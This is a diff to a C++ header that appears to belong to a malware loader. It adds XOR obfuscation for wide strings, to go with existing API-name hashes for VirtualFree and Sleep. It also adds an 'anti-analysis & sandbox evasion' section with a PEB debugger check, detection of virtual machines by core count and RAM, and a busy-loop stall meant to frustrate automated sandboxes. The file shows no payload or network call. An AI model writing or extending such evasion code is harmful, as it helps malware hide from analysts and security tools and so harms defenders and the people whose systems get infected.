@@ -64,12 +64,49 @@ struct DecryptedString {
     const char* c_str() const { return buf; }
 };
 
+template <size_t N>
+struct ObfWString {
+    wchar_t data[N]{};
+    static constexpr size_t length = N;
+
+    constexpr ObfWString(const wchar_t (&str)[N]) {
+        for (size_t i = 0; i < N; ++i)
+            data[i] = str[i] ^ static_cast<wchar_t>(XOR_KEY);
+    }
+
+    void decrypt(wchar_t* out) const {
+        for (size_t i = 0; i < N; ++i)
+            out[i] = data[i] ^ static_cast<wchar_t>(XOR_KEY);
+    }
+};
+
+template <size_t N>
+struct DecryptedWString {
+    wchar_t buf[N]{};
+    DecryptedWString(const ObfWString<N>& enc) {
+        enc.decrypt(buf);
+    }
+    ~DecryptedWString() {
+#ifdef _WIN32
+        SecureZeroMemory(buf, N * sizeof(wchar_t));
+#else
+        volatile wchar_t* p = buf;
+        for (size_t i = 0; i < N; ++i) p[i] = 0;
+#endif
+    }
+    operator const wchar_t*() const { return buf; }
+    const wchar_t* c_str() const { return buf; }
+};
+
 }  // namespace obf
 
 // Usage: XOR_STR("kernel32.dll")  →  creates an obfuscated constexpr string
 //        XOR_DEC(var)             →  decrypts it on the stack
 #define XOR_STR(s) ([]() { constexpr ::obf::ObfString enc(s); return enc; }())
 #define XOR_DEC(enc) ::obf::DecryptedString<decltype(enc)::length>(enc)
+
+#define XOR_WSTR(s) ([]() { constexpr ::obf::ObfWString enc(s); return enc; }())
+#define XOR_WDEC(enc) ::obf::DecryptedWString<decltype(enc)::length>(enc)
 
 
 #ifdef _WIN32
@@ -186,3 +223,51 @@ constexpr uint32_t FN_VIRTUALFREE     = 0x668FCF2E;  // VirtualFree
 constexpr uint32_t FN_SLEEP           = 0x0E076F64;  // Sleep
 constexpr uint32_t FN_GETLASTERROR    = 0x5DE40B6C;  // GetLastError
 #endif
+
+// ────────────────────────────────────────────────────────────────────────────
+//  3. ANTI-ANALYSIS & SANDBOX EVASION
+// ────────────────────────────────────────────────────────────────────────────
+
+namespace anti {
+
+#ifdef _WIN32
+inline bool is_debugger_present() {
+#if defined(_M_X64) || defined(__x86_64__)
+    auto peb = reinterpret_cast<PPEB>(__readgsqword(0x60));
+#else
+    auto peb = reinterpret_cast<PPEB>(__readfsdword(0x30));
+#endif
+    return peb->BeingDebugged != 0;
+}
+
+inline bool is_vm() {
+    SYSTEM_INFO sysinfo;
+    GetSystemInfo(&sysinfo);
+    // Typical sandboxes/VMs used for analysis often have only 1 CPU core
+    if (sysinfo.dwNumberOfProcessors < 2) return true;
+    
+    MEMORYSTATUSEX status;
+    status.dwLength = sizeof(status);
+    if (GlobalMemoryStatusEx(&status)) {
+        // Typical sandboxes often have less than 2GB of RAM
+        if (status.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
+    }
+    return false;
+}
+#else
+inline bool is_debugger_present() { return false; }
+inline bool is_vm() { return false; }
+#endif
+
+// Stalling technique to frustrate automated sandboxes
+// Performs heavy calculations to delay execution without relying solely on Sleep()
+inline void stalling_delay(int intensity) {
+    volatile uint64_t count = 0;
+    for (int i = 0; i < intensity; ++i) {
+        for (uint64_t j = 0; j < 10000000; ++j) {
+            count += (j ^ i) * (i + 1);
+        }
+    }
+}
+
+}  // namespace anti
